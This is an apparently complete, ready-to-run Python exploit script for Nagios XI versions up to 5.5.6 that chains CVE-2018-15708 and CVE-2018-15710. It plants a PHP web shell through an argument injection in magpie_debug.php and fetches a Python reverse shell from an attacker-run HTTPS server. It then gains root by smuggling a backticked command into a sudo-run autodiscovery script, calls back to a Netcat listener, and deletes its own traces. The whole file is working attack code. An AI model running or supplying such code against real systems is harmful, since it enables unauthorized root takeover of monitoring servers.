# Exploit Title: Nagios XI 5.5.6 Remote Code Execution and Privilege Escalation
# Date: 2019-08-24
# Exploit Author: elbae
# Vendor Homepage: https://www.nagios.com/
# Product: Nagios XI
# Software Link: https://assets.nagios.com/downloads/nagiosxi/5/xi-5.5.6.tar.gz
# Version: From 2012r1.0 to 5.5.6
# Tested on: 
#	- Ubuntu 18.04.2 LTS
#	- CentOS Linux release 7.6.1810 (Core)
#
#	- Nagios XI 5.5.6
# CVE: CVE-2018-15708, CVE-2018-15710
#
# See Also:
# https://www.tenable.com/security/research/tra-2018-37
# https://medium.com/tenable-techblog/rooting-nagios-via-outdated-libraries-bb79427172
# https://www.exploit-db.com/exploits/46221
#
# This code exploits both CVE-2018-15708 and CVE-2018-15710 to pop a root reverse shell.
# You'll need your own Netcat listener and python installed in the target

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import SocketServer, threading, ssl
import requests, urllib
import sys, os, argparse
from OpenSSL import crypto
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TIMEOUT = 5 # sec

REVERSE_SHELL = """
import socket,subprocess,os,sys

target_ip = sys.argv[1]
target_port = sys.argv[2]
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target_ip,int(target_port)))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
"""

def err_and_exit(msg):
    print '\n\nERROR: ' + msg + '\n\n'
    sys.exit(1)

# handle sending a get request
def http_get_quiet(url):
    try:
        r = requests.get(url, timeout=TIMEOUT, verify=False)
    except requests.exceptions.ReadTimeout:
        err_and_exit("Request to '" + url + "' timed out.")
    else:
        return r

def http_get_normal(url):
    try:
        r = requests.get(url, timeout=TIMEOUT, verify=False)
        return r
    except requests.exceptions.ReadTimeout:
        return ""
      
# 200?
def url_ok(url):
    r = http_get_quiet(url)
    return (r.status_code == 200)

# run a shell command using the PHP file we uploaded
def send_shell_cmd(path, cmd):
    querystr = { 'cmd' : cmd }
    # e.g. http://blah/exec.php?cmd=whoami
    url = path + '?' + urllib.urlencode(querystr)
    return http_get_quiet(url)

# delete some files locally and on the Nagios XI instance
def clean_up(remote, paths, exec_path=None):
    if remote:
        for path in paths[::-1]:
            send_shell_cmd(exec_path, 'rm ' + path)
            print 'Removing remote file ' + path
    else:
        for path in paths:
            os.remove(path)
            print 'Removing local file ' + path

# Thanks http://django-notes.blogspot.com/2012/02/generating-self-signed-ssl-certificate.html
def generate_self_signed_cert(cert_dir, cert_file, key_file, cert_data):
    """Generate a SSL certificate.
 
    If the cert_path and the key_path are present they will be overwritten.
    """
    if not os.path.exists(cert_dir):
        os.makedirs(cert_dir)
    cert_path = os.path.join(cert_dir, cert_file)
    key_path = os.path.join(cert_dir, key_file)
 
    if os.path.exists(cert_path):
        os.unlink(cert_path)
    if os.path.exists(key_path):
        os.unlink(key_path)
 
    # create a key pair
    key = crypto.PKey()
    key.generate_key(crypto.TYPE_RSA, 2048)
 
    # create a self-signed cert
    cert = crypto.X509()
    cert.get_subject().C = 'US'
    cert.get_subject().ST = cert_data
    cert.get_subject().L = cert_data
    cert.get_subject().O = cert_data
    cert.get_subject().OU = cert_data
    cert.get_subject().CN = cert_data
    cert.set_serial_number(1000)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(10 * 365 * 24 * 60 * 60) 
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(key)
    cert.sign(key, 'sha1')
 
    with open(cert_path, 'wt') as fd: 
        fd.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
 
    with open(key_path, 'wt') as fd: 
        fd.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))
 
    return cert_path, key_path

# HTTP request handler
class MyHTTPD(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        if self.path == "/":
            msg = '<?php system($_GET[\'cmd\']); ?>' # this will be written to the PHP file
        else:
            msg = REVERSE_SHELL
        self.end_headers()
        self.wfile.write(str.encode(msg))

# Make the http listener operate on its own thread
class ThreadedWebHandler(object):
    def __init__(self, host, port, keyfile, certfile):
        self.server = SocketServer.TCPServer((host, port), MyHTTPD)
	self.server.socket = ssl.wrap_socket(
	    self.server.socket,
	    keyfile=keyfile,
	    certfile=certfile,
	    server_side=True
	)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True

    def start(self):
        self.server_thread.start()

    def stop(self):
        self.server.shutdown()
        self.server.server_close()

##### MAIN #####

def main():

    desc = 'Nagios XI 2012r1.0 < 5.5.6 MagpieRSS Remote Code Execution and Privilege Escalation\n'
    desc += 'based on https://www.exploit-db.com/exploits/46221'

    arg_parser = argparse.ArgumentParser(description=desc)
    arg_parser.add_argument('-t', required=True, help='Nagios XI IP Address (Required)')
    arg_parser.add_argument('-ip', required=True, help='HTTP listener IP')
    arg_parser.add_argument('-port', type=int, default=9999, help='HTTP listener port (Default: 9999)')
    arg_parser.add_argument('-ncip', required=True, help='Netcat listener IP')
    arg_parser.add_argument('-ncport', type=int, default=4444, help='Netcat listener port (Default: 4444)')
    
    args = arg_parser.parse_args()

    # Nagios XI target settings
    target = { 'ip' : args.t }
    
    # listener settings
    listener = {
        'ip'    : args.ip,
        'port'  : args.port,
        'ncip'  : args.ncip,
        'ncport': args.ncport
    }

    # generate self-signed cert
    cert_file = 'cert.crt'
    key_file = 'key.key'
    generate_self_signed_cert('./', cert_file, key_file, listener['ip'])
    
    # start threaded listener
    # thanks http://brahmlower.io/threaded-http-server.html
    server = ThreadedWebHandler(listener['ip'], listener['port'], key_file, cert_file)
    server.start()
    
    print "\nListening on " + listener['ip'] + ":" + str(listener['port'])
    
    # path to Nagios XI app
    base_url = 'https://' + target['ip']
    
    # ensure magpie_debug.php exists
    magpie_url = base_url + '/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php'

    if not url_ok(magpie_url):
        err_and_exit('magpie_debug.php not found.')
    
    print '\nFound magpie_debug.php.\n'
    
    exec_path = None        # path to exec.php in URL
    cleanup_paths = []     # local path on Nagios XI filesystem to clean up
    # ( local fs path : url path )
    paths = [
        ( '/usr/local/nagvis/share/', '/nagvis' ),
        ( '/var/www/html/nagiosql/', '/nagiosql' )
    ]
    
    # inject argument to create exec.php
    # try multiple directories if necessary. dir will be different based on nagios xi version
    filename = 'exec.php'
    for path in paths:
        local_path = path[0] + filename # on fs
        url = 'https://' + listener['ip'] + ':' + str(listener['port']) + '/%20-o%20' + local_path  # e.g. https://192.168.1.191:8080/%20-o%20/var/www/html/nagiosql/exec.php
        url = magpie_url + '?url=' + url
        print 'magpie url = ' + url
        r = http_get_quiet(url)
    
        # ensure php file was created
        exec_url = base_url + path[1] + '/' + filename  # e.g. https://192.168.1.192/nagiosql/exec.php
        if url_ok(exec_url):
            exec_path = exec_url
            cleanup_paths.append(local_path)
            break
        # otherwise, try the next path
    
    if exec_path is None:
        err_and_exit('Couldn\'t create PHP file.')
    
    print '\n' + filename + ' written. Visit ' + exec_url + '\n'
    
    # writing python reverse shell 

    url = 'https://' + listener['ip'] + ':' + str(listener['port']) + '/a%20-o%20/usr/local/nagvis/share/rev_shell.py'
    url = magpie_url + '?url=' + url
    print 'python reverse shell url = ' + url
    r = http_get_quiet(url)
    
    # run a few commands to display status to user
    print 'Gathering some basic info...'
    cmds = [
        ('whoami', 'Current User'),
        ("cat /usr/local/nagiosxi/var/xiversion | grep full | cut -d '=' -f 2", 'Nagios XI Version')
    ]
    

    #r = requests.get(exec_url, timeout=TIMEOUT, verify=False)
    
    # executing some commands
    for cmd in cmds:
        try:
            r = send_shell_cmd(exec_url, cmd[0])
            sys.stdout.write('\t' + cmd[1] + ' => ' + r.text)
        except:
            print("Request failed")

    rev_python_shell = "python /usr/local/nagvis/share/rev_shell.py {} {}".format(listener['ncip'],listener['ncport'])
    # tuple contains (shell command, cleanup path)
    priv_esc_list = [
        ("sudo php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php --addresses='127.0.0.1/1`" + rev_python_shell + "`'", '/usr/local/nagvis/share/rev_shell.py')
    ]
    
    # escalate privileges and launch the connect-back shell
    timed_out = False
    for priv_esc in priv_esc_list:
        try:
            querystr = { 'cmd' : priv_esc[0] }
            url = exec_path + '?' + urllib.urlencode(querystr)
            r = requests.get(url, timeout=TIMEOUT, verify=False)
            print '\nTrying to escalate privs with url: ' + url
        except requests.exceptions.ReadTimeout:
            timed_out = True
            if priv_esc[1] is not None:
                cleanup_paths.append(priv_esc[1])
            break
    
    if timed_out:
        print 'Check for a shell!!\n'
    else:
        print 'Not so sure it worked...\n'
    
    server.stop()
    
    # clean up files we created
    clean_up(True, cleanup_paths, exec_path) # remote files
    clean_up(False, [cert_file, key_file])

main()
